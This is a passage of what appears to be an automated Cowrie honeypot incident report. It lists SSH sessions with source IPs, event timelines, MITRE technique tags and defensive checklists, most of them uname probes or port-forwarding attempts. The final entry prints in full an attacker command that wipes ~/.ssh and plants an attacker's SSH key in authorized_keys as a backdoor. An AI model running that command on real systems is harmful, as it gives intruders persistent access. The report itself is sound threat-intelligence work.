| **Last Seen** | 2026-08-08 03:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:05:42` | `cowrie.session.connect` |
| `2026-08-08 03:05:42` | `cowrie.client.version` |
| `2026-08-08 03:05:42` | `cowrie.client.kex` |
| `2026-08-08 03:05:43` | `cowrie.login.success` |
| `2026-08-08 03:05:43` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:05:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.84[.]130` to AbuseIPDB if not already reported
- [ ] Block `83.239.84[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d785e5c5f2b6

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:07 |
| **Last Seen** | 2026-08-08 03:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:07:17` | `cowrie.session.connect` |
| `2026-08-08 03:07:17` | `cowrie.client.version` |
| `2026-08-08 03:07:17` | `cowrie.client.kex` |
| `2026-08-08 03:07:18` | `cowrie.login.success` |
| `2026-08-08 03:07:18` | `cowrie.session.params` |
| `2026-08-08 03:07:18` | `cowrie.command.input` |
| `2026-08-08 03:07:19` | `cowrie.log.closed` |
| `2026-08-08 03:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62e2346a6bff

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-08-08 03:08 |
| **Last Seen** | 2026-08-08 03:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:08:02` | `cowrie.session.connect` |
| `2026-08-08 03:08:02` | `cowrie.client.version` |
| `2026-08-08 03:08:02` | `cowrie.client.kex` |
| `2026-08-08 03:08:04` | `cowrie.login.success` |
| `2026-08-08 03:08:04` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2237685df91

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]8` |
| **First Seen** | 2026-08-08 03:08 |
| **Last Seen** | 2026-08-08 03:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:08:09` | `cowrie.session.connect` |
| `2026-08-08 03:08:10` | `cowrie.client.version` |
| `2026-08-08 03:08:10` | `cowrie.client.kex` |
| `2026-08-08 03:08:12` | `cowrie.login.success` |
| `2026-08-08 03:08:13` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]8` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd9cbe9179a4

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-08-08 03:08 |
| **Last Seen** | 2026-08-08 03:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:08:15` | `cowrie.session.connect` |
| `2026-08-08 03:08:16` | `cowrie.client.version` |
| `2026-08-08 03:08:16` | `cowrie.client.kex` |
| `2026-08-08 03:08:17` | `cowrie.login.success` |
| `2026-08-08 03:08:18` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87eaf90d5890

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:09 |
| **Last Seen** | 2026-08-08 03:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:09:05` | `cowrie.session.connect` |
| `2026-08-08 03:09:05` | `cowrie.client.version` |
| `2026-08-08 03:09:06` | `cowrie.client.kex` |
| `2026-08-08 03:09:06` | `cowrie.login.success` |
| `2026-08-08 03:09:07` | `cowrie.session.params` |
| `2026-08-08 03:09:07` | `cowrie.command.input` |
| `2026-08-08 03:09:07` | `cowrie.log.closed` |
| `2026-08-08 03:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92c98735e69f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:10 |
| **Last Seen** | 2026-08-08 03:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:10:53` | `cowrie.session.connect` |
| `2026-08-08 03:10:53` | `cowrie.client.version` |
| `2026-08-08 03:10:53` | `cowrie.client.kex` |
| `2026-08-08 03:10:53` | `cowrie.login.success` |
| `2026-08-08 03:10:54` | `cowrie.session.params` |
| `2026-08-08 03:10:54` | `cowrie.command.input` |
| `2026-08-08 03:10:54` | `cowrie.log.closed` |
| `2026-08-08 03:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68d643b4d6f8

| Field | Detail |
|---|---|
| **Source IP** | `194.85.69[.]22` |
| **First Seen** | 2026-08-08 03:11 |
| **Last Seen** | 2026-08-08 03:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:11:24` | `cowrie.session.connect` |
| `2026-08-08 03:11:24` | `cowrie.client.version` |
| `2026-08-08 03:11:24` | `cowrie.client.kex` |
| `2026-08-08 03:11:25` | `cowrie.login.success` |
| `2026-08-08 03:11:26` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.85.69[.]22` to AbuseIPDB if not already reported
- [ ] Block `194.85.69[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b47cdf4e5df9

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-08-08 03:11 |
| **Last Seen** | 2026-08-08 03:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:11:35` | `cowrie.session.connect` |
| `2026-08-08 03:11:36` | `cowrie.client.version` |
| `2026-08-08 03:11:36` | `cowrie.client.kex` |
| `2026-08-08 03:11:38` | `cowrie.login.success` |
| `2026-08-08 03:11:39` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd984d0a43b4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:12 |
| **Last Seen** | 2026-08-08 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:12:35` | `cowrie.session.connect` |
| `2026-08-08 03:12:35` | `cowrie.client.version` |
| `2026-08-08 03:12:35` | `cowrie.client.kex` |
| `2026-08-08 03:12:35` | `cowrie.login.success` |
| `2026-08-08 03:12:36` | `cowrie.session.params` |
| `2026-08-08 03:12:36` | `cowrie.command.input` |
| `2026-08-08 03:12:36` | `cowrie.log.closed` |
| `2026-08-08 03:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b6a204f8922

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:14 |
| **Last Seen** | 2026-08-08 03:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:14:20` | `cowrie.session.connect` |
| `2026-08-08 03:14:20` | `cowrie.client.version` |
| `2026-08-08 03:14:20` | `cowrie.client.kex` |
| `2026-08-08 03:14:20` | `cowrie.login.success` |
| `2026-08-08 03:14:21` | `cowrie.session.params` |
| `2026-08-08 03:14:21` | `cowrie.command.input` |
| `2026-08-08 03:14:21` | `cowrie.log.closed` |
| `2026-08-08 03:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a339da58fd

| Field | Detail |
|---|---|
| **Source IP** | `182.52.72[.]189` |
| **First Seen** | 2026-08-08 03:15 |
| **Last Seen** | 2026-08-08 03:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:15:21` | `cowrie.session.connect` |
| `2026-08-08 03:15:22` | `cowrie.client.version` |
| `2026-08-08 03:15:22` | `cowrie.client.kex` |
| `2026-08-08 03:15:24` | `cowrie.login.success` |
| `2026-08-08 03:15:24` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.72[.]189` to AbuseIPDB if not already reported
- [ ] Block `182.52.72[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b53248786a65

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 03:15 |
| **Last Seen** | 2026-08-08 03:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:15:45` | `cowrie.session.connect` |
| `2026-08-08 03:15:45` | `cowrie.client.version` |
| `2026-08-08 03:15:45` | `cowrie.client.kex` |
| `2026-08-08 03:15:45` | `cowrie.login.success` |
| `2026-08-08 03:15:45` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:15:45` | `cowrie.direct-tcpip.data` |
| `2026-08-08 03:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2a8d462aa8d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:16 |
| **Last Seen** | 2026-08-08 03:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:16:08` | `cowrie.session.connect` |
| `2026-08-08 03:16:08` | `cowrie.client.version` |
| `2026-08-08 03:16:08` | `cowrie.client.kex` |
| `2026-08-08 03:16:08` | `cowrie.login.success` |
| `2026-08-08 03:16:09` | `cowrie.session.params` |
| `2026-08-08 03:16:09` | `cowrie.command.input` |
| `2026-08-08 03:16:09` | `cowrie.log.closed` |
| `2026-08-08 03:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-900bf2f6120c

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]214` |
| **First Seen** | 2026-08-08 03:16 |
| **Last Seen** | 2026-08-08 03:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:16:45` | `cowrie.session.connect` |
| `2026-08-08 03:16:45` | `cowrie.client.version` |
| `2026-08-08 03:16:45` | `cowrie.client.kex` |
| `2026-08-08 03:16:47` | `cowrie.login.success` |
| `2026-08-08 03:16:48` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]214` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83418685a08d

| Field | Detail |
|---|---|
| **Source IP** | `81.237.155[.]113` |
| **First Seen** | 2026-08-08 03:16 |
| **Last Seen** | 2026-08-08 03:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:16:57` | `cowrie.session.connect` |
| `2026-08-08 03:16:57` | `cowrie.client.version` |
| `2026-08-08 03:16:57` | `cowrie.client.kex` |
| `2026-08-08 03:16:58` | `cowrie.login.success` |
| `2026-08-08 03:16:58` | `cowrie.direct-tcpip.request` |
| `2026-08-08 03:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.237.155[.]113` to AbuseIPDB if not already reported
- [ ] Block `81.237.155[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd5eefd6f100

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:17 |
| **Last Seen** | 2026-08-08 03:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:17:52` | `cowrie.session.connect` |
| `2026-08-08 03:17:52` | `cowrie.client.version` |
| `2026-08-08 03:17:52` | `cowrie.client.kex` |
| `2026-08-08 03:17:52` | `cowrie.login.success` |
| `2026-08-08 03:17:53` | `cowrie.session.params` |
| `2026-08-08 03:17:53` | `cowrie.command.input` |
| `2026-08-08 03:17:53` | `cowrie.log.closed` |
| `2026-08-08 03:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b273326d915

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:19 |
| **Last Seen** | 2026-08-08 03:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:19:31` | `cowrie.session.connect` |
| `2026-08-08 03:19:31` | `cowrie.client.version` |
| `2026-08-08 03:19:31` | `cowrie.client.kex` |
| `2026-08-08 03:19:31` | `cowrie.login.success` |
| `2026-08-08 03:19:32` | `cowrie.session.params` |
| `2026-08-08 03:19:32` | `cowrie.command.input` |
| `2026-08-08 03:19:32` | `cowrie.log.closed` |
| `2026-08-08 03:19:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90adeb742754

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:21 |
| **Last Seen** | 2026-08-08 03:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:21:18` | `cowrie.session.connect` |
| `2026-08-08 03:21:18` | `cowrie.client.version` |
| `2026-08-08 03:21:18` | `cowrie.client.kex` |
| `2026-08-08 03:21:18` | `cowrie.login.success` |
| `2026-08-08 03:21:19` | `cowrie.session.params` |
| `2026-08-08 03:21:19` | `cowrie.command.input` |
| `2026-08-08 03:21:19` | `cowrie.log.closed` |
| `2026-08-08 03:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1c19f64b9d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:23 |
| **Last Seen** | 2026-08-08 03:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:23:05` | `cowrie.session.connect` |
| `2026-08-08 03:23:05` | `cowrie.client.version` |
| `2026-08-08 03:23:05` | `cowrie.client.kex` |
| `2026-08-08 03:23:05` | `cowrie.login.success` |
| `2026-08-08 03:23:06` | `cowrie.session.params` |
| `2026-08-08 03:23:06` | `cowrie.command.input` |
| `2026-08-08 03:23:06` | `cowrie.log.closed` |
| `2026-08-08 03:23:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ff48e5764aa

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:24 |
| **Last Seen** | 2026-08-08 03:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:24:49` | `cowrie.session.connect` |
| `2026-08-08 03:24:49` | `cowrie.client.version` |
| `2026-08-08 03:24:49` | `cowrie.client.kex` |
| `2026-08-08 03:24:49` | `cowrie.login.success` |
| `2026-08-08 03:24:50` | `cowrie.session.params` |
| `2026-08-08 03:24:50` | `cowrie.command.input` |
| `2026-08-08 03:24:50` | `cowrie.log.closed` |
| `2026-08-08 03:24:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acab18c0a981

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:26 |
| **Last Seen** | 2026-08-08 03:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:26:34` | `cowrie.session.connect` |
| `2026-08-08 03:26:34` | `cowrie.client.version` |
| `2026-08-08 03:26:34` | `cowrie.client.kex` |
| `2026-08-08 03:26:34` | `cowrie.login.success` |
| `2026-08-08 03:26:35` | `cowrie.session.params` |
| `2026-08-08 03:26:35` | `cowrie.command.input` |
| `2026-08-08 03:26:35` | `cowrie.log.closed` |
| `2026-08-08 03:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dcf7862d603

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:28 |
| **Last Seen** | 2026-08-08 03:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:28:23` | `cowrie.session.connect` |
| `2026-08-08 03:28:23` | `cowrie.client.version` |
| `2026-08-08 03:28:23` | `cowrie.client.kex` |
| `2026-08-08 03:28:24` | `cowrie.login.success` |
| `2026-08-08 03:28:25` | `cowrie.session.params` |
| `2026-08-08 03:28:25` | `cowrie.command.input` |
| `2026-08-08 03:28:25` | `cowrie.log.closed` |
| `2026-08-08 03:28:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31256148a8b9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 03:30 |
| **Last Seen** | 2026-08-08 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:30:08` | `cowrie.session.connect` |
| `2026-08-08 03:30:08` | `cowrie.client.version` |
| `2026-08-08 03:30:08` | `cowrie.client.kex` |
| `2026-08-08 03:30:09` | `cowrie.login.success` |
| `2026-08-08 03:30:09` | `cowrie.session.params` |
| `2026-08-08 03:30:09` | `cowrie.command.input` |
| `2026-08-08 03:30:09` | `cowrie.log.closed` |
| `2026-08-08 03:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd0ec15a17d6

| Field | Detail |
|---|---|
| **Source IP** | `50.84.211[.]204` |
| **First Seen** | 2026-08-08 03:31 |
| **Last Seen** | 2026-08-08 03:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 03:31:06` | `cowrie.session.connect` |
| `2026-08-08 03:31:06` | `cowrie.client.version` |
| `2026-08-08 03:31:06` | `cowrie.client.kex` |
| `2026-08-08 03:31:07` | `cowrie.login.success` |
| `2026-08-08 03:31:07` | `cowrie.session.params` |
| `2026-08-08 03:31:07` | `cowrie.command.input` |
